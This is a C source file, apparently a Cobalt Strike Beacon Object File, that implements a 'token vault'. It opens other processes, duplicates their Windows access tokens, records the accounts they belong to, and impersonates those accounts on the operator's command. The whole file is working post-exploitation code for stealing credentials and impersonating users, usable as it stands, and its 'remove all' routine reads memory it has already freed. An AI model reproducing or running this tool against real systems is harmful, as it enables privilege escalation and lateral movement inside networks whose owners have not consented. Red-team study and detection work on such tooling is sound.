#include <stdint.h>
#include <windows.h>
#include "beacon.h"

// clang-format off
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
// clang-format on

#define MAX_NAME 256

#define CMD_CREATE 1
#define CMD_STEAL 2
#define CMD_SHOW 3
#define CMD_USE 4
#define CMD_REMOVE 5
#define CMD_REMOVE_ALL 6

struct vault_item {
    HANDLE token;
    DWORD pid;
    char username[MAX_NAME];
    char domain[MAX_NAME];
    struct vault_item *next;
};

struct vault {
    struct vault_item *head;
};

struct vault *vault_create() {
    struct vault *vault = (struct vault *)MSVCRT$malloc(sizeof(struct vault));
    vault->head = NULL;
    return vault;
}

struct vault_item *vault_insert(struct vault *vault, HANDLE handle, DWORD pid) {
    struct vault_item *item = (struct vault_item *)MSVCRT$malloc(sizeof(struct vault_item));
    item->token = handle;
    item->pid = pid;
    item->username[0] = '\0';
    item->domain[0] = '\0';
    item->next = vault->head;
    vault->head = item;
    return item;
}

struct vault_item **find_inderect(struct vault *vault, DWORD pid) {
    struct vault_item **p = &vault->head;
    while (*p && (*p)->pid != pid)
        p = &(*p)->next;
    return p;
}

struct vault_item *vault_find(struct vault *vault, DWORD pid) {
    return *find_inderect(vault, pid);
}

void vault_remove(struct vault *vault, DWORD pid) {
    struct vault_item **item = find_inderect(vault, pid);
    if (*item) {
        struct vault_item *tmp = *item;
        KERNEL32$CloseHandle(tmp->token);
        *item = tmp->next;
        MSVCRT$free(tmp);
    }
}

size_t vault_count(struct vault *vault) {
    struct vault_item *i = vault->head;
    size_t count = 0;
    while (i) {
        ++count;
        i = i->next;
    }
    return count;
}

BOOL steal_token(DWORD pid, PHANDLE hTarget) {
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!hProcess) {
        return FALSE;
    }
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        KERNEL32$CloseHandle(hProcess);
        return FALSE;
    }
    // clang-format off
    BOOL result = ADVAPI32$DuplicateTokenEx(hToken,
                                            TOKEN_ADJUST_DEFAULT |
                                            TOKEN_ADJUST_SESSIONID |
                                            TOKEN_QUERY |
                                            TOKEN_DUPLICATE |
                                            TOKEN_ASSIGN_PRIMARY,
                                            NULL,
                                            SecurityImpersonation, TokenPrimary, hTarget);
    // clang-format on
    KERNEL32$CloseHandle(hProcess);
    return result;
}

void get_username(HANDLE token, struct vault_item *item) {
    PTOKEN_USER user;
    DWORD out;
    ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &out);
    user = (PTOKEN_USER)MSVCRT$malloc(out);
    if (ADVAPI32$GetTokenInformation(token, TokenUser, user, out, &out)) {
        DWORD uSize = MAX_NAME;
        DWORD dSize = MAX_NAME;
        SID_NAME_USE sidType;
        if (!ADVAPI32$LookupAccountSidA(NULL, user->User.Sid, item->username, &uSize, item->domain, &dSize, &sidType)) {
            item->username[0] = '\0';
            item->domain[0] = '\0';
        }
    }
    MSVCRT$free(user);
    return;
}

struct vault_item *action_steal_token(struct vault *vault, WORD pid) {
    HANDLE token;
    if (steal_token(pid, &token)) {
        struct vault_item *item = vault_insert(vault, token, pid);
        get_username(token, item);
        BeaconPrintf(CALLBACK_OUTPUT, "%i: %s\\%s", item->pid, item->domain, item->username);
        return item;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Error: %i: %i", pid, KERNEL32$GetLastError());
    }
    return NULL;
}

struct vault *BeaconDataVault(datap *parser) {
    uint64_t a1, a2;
    a1 = BeaconDataInt(parser);
    a2 = BeaconDataInt(parser);
    return (struct vault *)(a1 + (a2 << 32));
}

static int char_iequal(char a, char b) {
    if (a >= 'A' && a <= 'Z')
        a = (char)(a + 32);
    if (b >= 'A' && b <= 'Z')
        b = (char)(b + 32);
    return a == b;
}

static int str_iequal(const char *a, const char *b) {
    while (*a && *b) {
        if (!char_iequal(*a, *b))
            return 0;
        a++;
        b++;
    }
    return *a == *b;
}

static void skip_space(const char **p) {
    while (**p == ' ' || **p == '\t')
        (*p)++;
}

static int take_token(const char **p, char *out, int outlen) {
    int n = 0;
    skip_space(p);
    if (!**p)
        return 0;
    while (**p && **p != ' ' && **p != '\t') {
        if (n + 1 < outlen)
            out[n++] = **p;
        (*p)++;
    }
    out[n] = '\0';
    return n > 0;
}

static uint64_t parse_hex_u64(const char *text) {
    const char *p = text;
    uint64_t value = 0;
    int seen = 0;

    if (!p || !*p)
        return 0;
    if (p[0] == '0' && (p[1] == 'x' || p[1] == 'X'))
        p += 2;
    while (*p) {
        char c = *p;
        int digit = -1;
        if (c >= '0' && c <= '9')
            digit = c - '0';
        else if (c >= 'a' && c <= 'f')
            digit = 10 + (c - 'a');
        else if (c >= 'A' && c <= 'F')
            digit = 10 + (c - 'A');
        else
            break;
        value = (value << 4) + (uint64_t)digit;
        seen = 1;
        p++;
    }
    return seen ? value : 0;
}

static DWORD parse_u32(const char *text) {
    const char *p = text;
    DWORD value = 0;
    int seen = 0;
    while (*p >= '0' && *p <= '9') {
        value = value * 10 + (DWORD)(*p - '0');
        seen = 1;
        p++;
    }
    return seen ? value : 0;
}

static struct vault *vault_from_text(const char *text) {
    return (struct vault *)parse_hex_u64(text);
}

static void cmd_create(void) {
    struct vault *vault = vault_create();
    BeaconPrintf(CALLBACK_OUTPUT, "token vault created: %p", vault);
}

static void cmd_show(struct vault *vault) {
    size_t items = vault_count(vault);
    formatp obj;
    BeaconFormatAlloc(&obj, items * (MAX_NAME + MAX_NAME + 16));

    struct vault_item *item = vault->head;
    while (item) {
        BeaconFormatPrintf(&obj, "%i: %s\\%s\n", item->pid, item->domain, item->username);
        item = item->next;
    }

    int out_len;
    char *data = BeaconFormatToString(&obj, &out_len);
    BeaconOutput(CALLBACK_OUTPUT, data, out_len);
    BeaconFormatFree(&obj);
}

static void cmd_use(struct vault *vault, DWORD token_id) {
    WORD pid = (WORD)token_id;
    struct vault_item *item = vault_find(vault, pid);
    if (item) {
        BeaconUseToken(item->token);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "token of %i not in the vault; try to get it.", pid);
        item = action_steal_token(vault, pid);
        if (item) {
            BeaconUseToken(item->token);
        }
    }
}

static void cmd_remove(struct vault *vault, DWORD token_id) {
    WORD pid = (WORD)token_id;
    vault_remove(vault, pid);
    BeaconPrintf(CALLBACK_OUTPUT, "removed: %i", pid);
}

static void cmd_remove_all(struct vault *vault) {
    size_t items = vault_count(vault);
    formatp obj;
    BeaconFormatAlloc(&obj, items * 32);

    struct vault_item *item = vault->head;
    while (item) {
        BeaconFormatPrintf(&obj, "removed: %i\n", item->pid);
        vault_remove(vault, item->pid);
        item = item->next;
    }

    int out_len;
    char *data = BeaconFormatToString(&obj, &out_len);
    BeaconOutput(CALLBACK_OUTPUT, data, out_len);
    BeaconFormatFree(&obj);
}

static void steal_pid_list(struct vault *vault, const char *pid_list) {
    const char *p = pid_list;
    char part[16];

    while (*p) {
        int n = 0;
        while (*p && *p != ',' && n + 1 < (int)sizeof(part)) {
            part[n++] = *p;
            p++;
        }
        part[n] = '\0';
        if (n > 0)
            action_steal_token(vault, (WORD)parse_u32(part));
        if (*p == ',')
            p++;
    }
}

static void run_packed_legacy(int cmd, datap *parser) {
    if (cmd == CMD_CREATE) {
        cmd_create();
    } else if (cmd == CMD_STEAL) {
        struct vault *vault = BeaconDataVault(parser);
        int pid_count = BeaconDataInt(parser);
        for (int i = 0; i < pid_count; ++i) {
            WORD pid = BeaconDataShort(parser);
            action_steal_token(vault, pid);
        }
    } else if (cmd == CMD_SHOW) {
        cmd_show(BeaconDataVault(parser));
    } else if (cmd == CMD_USE) {
        cmd_use(BeaconDataVault(parser), (DWORD)BeaconDataShort(parser));
    } else if (cmd == CMD_REMOVE) {
        cmd_remove(BeaconDataVault(parser), (DWORD)BeaconDataShort(parser));
    } else if (cmd == CMD_REMOVE_ALL) {
        cmd_remove_all(BeaconDataVault(parser));
    }
}

static void run_command_line(char *line) {
    const char *cursor = line;
    char verb[32];
    char arg1[512];
    char arg2[512];

    if (!take_token(&cursor, verb, sizeof(verb))) {
        BeaconPrintf(CALLBACK_ERROR, "missing command");
        return;
    }

    if (str_iequal(verb, "set")) {
        BeaconPrintf(CALLBACK_ERROR, "set is handled by the Cobalt Strike CNA client only");
        return;
    }

    if (str_iequal(verb, "create")) {
        cmd_create();
        return;
    }

    if (str_iequal(verb, "steal")) {
        if (!take_token(&cursor, arg1, sizeof(arg1)) || !take_token(&cursor, arg2, sizeof(arg2))) {
            BeaconPrintf(CALLBACK_ERROR, "steal requires <pids> and <vault-id>");
            return;
        }
        steal_pid_list(vault_from_text(arg2), arg1);
        return;
    }

    if (str_iequal(verb, "show")) {
        if (!take_token(&cursor, arg1, sizeof(arg1))) {
            BeaconPrintf(CALLBACK_ERROR, "show requires <vault-id>");
            return;
        }
        cmd_show(vault_from_text(arg1));
        return;
    }

    if (str_iequal(verb, "use")) {
        if (!take_token(&cursor, arg1, sizeof(arg1)) || !take_token(&cursor, arg2, sizeof(arg2))) {
            BeaconPrintf(CALLBACK_ERROR, "use requires <token-id> and <vault-id>");
            return;
        }
        cmd_use(vault_from_text(arg2), parse_u32(arg1));
        return;
    }

    if (str_iequal(verb, "remove")) {
        if (!take_token(&cursor, arg1, sizeof(arg1)) || !take_token(&cursor, arg2, sizeof(arg2))) {
            BeaconPrintf(CALLBACK_ERROR, "remove requires <token-id> and <vault-id>");
            return;
        }
        cmd_remove(vault_from_text(arg2), parse_u32(arg1));
        return;
    }

    if (str_iequal(verb, "remove-all") || str_iequal(verb, "remove_all")) {
        if (!take_token(&cursor, arg1, sizeof(arg1))) {
            BeaconPrintf(CALLBACK_ERROR, "remove-all requires <vault-id>");
            return;
        }
        cmd_remove_all(vault_from_text(arg1));
        return;
    }

    BeaconPrintf(CALLBACK_ERROR, "unknown command: %s", verb);
}

void go(char *args, int len) {
    datap parser;
    char *line;

    BeaconDataParse(&parser, args, len);
    line = BeaconDataExtract(&parser, NULL);
    if (line && line[0] != '\0') {
        run_command_line(line);
        return;
    }

    BeaconDataParse(&parser, args, len);
    run_packed_legacy(BeaconDataInt(&parser), &parser);
}
